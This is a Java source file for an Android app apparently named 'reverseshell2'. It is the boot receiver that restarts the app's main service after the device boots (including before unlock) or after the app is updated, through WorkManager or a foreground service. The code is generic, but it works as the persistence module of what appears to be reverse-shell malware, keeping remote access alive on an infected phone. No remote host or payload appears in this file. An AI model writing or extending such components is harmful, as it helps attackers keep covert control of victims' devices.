package com.example.reverseshell2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import androidx.core.content.ContextCompat;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

public class bootReceiver extends BroadcastReceiver {
    private static final String TAG = "bootReceiverClass";
    private static final String WORK_NAME = "service_startup_work";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) {
            return;
        }

        String action = intent.getAction();
        Log.d(TAG, "Received broadcast action: " + action);

        switch (action) {
            case Intent.ACTION_BOOT_COMPLETED:
            case Intent.ACTION_LOCKED_BOOT_COMPLETED:
            case Intent.ACTION_MY_PACKAGE_REPLACED:
                scheduleServiceStart(context);
                break;
            case Intent.ACTION_PACKAGE_FULLY_REMOVED:
                // Handle app uninstall if needed
                break;
        }
    }

    private void scheduleServiceStart(Context context) {
        // For Android 12+ we use WorkManager to schedule service start
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            scheduleWorkManager(context);
        } else {
            startServiceDirectly(context);
        }
    }

    private void scheduleWorkManager(Context context) {
        try {
            Constraints constraints = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build();

            OneTimeWorkRequest workRequest = new OneTimeWorkRequest.Builder(ServiceStartWorker.class)
                    .setConstraints(constraints)
                    .build();

            WorkManager.getInstance(context)
                    .enqueueUniqueWork(
                            WORK_NAME,
                            ExistingWorkPolicy.REPLACE,
                            workRequest);

            Log.d(TAG, "Scheduled service start work");
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling work", e);
            // Fallback to direct start
            startServiceDirectly(context);
        }
    }

    private void startServiceDirectly(Context context) {
        try {
            Intent serviceIntent = new Intent(context, mainService.class);
            serviceIntent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            
            Log.d(TAG, "Started service directly");
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
    }
}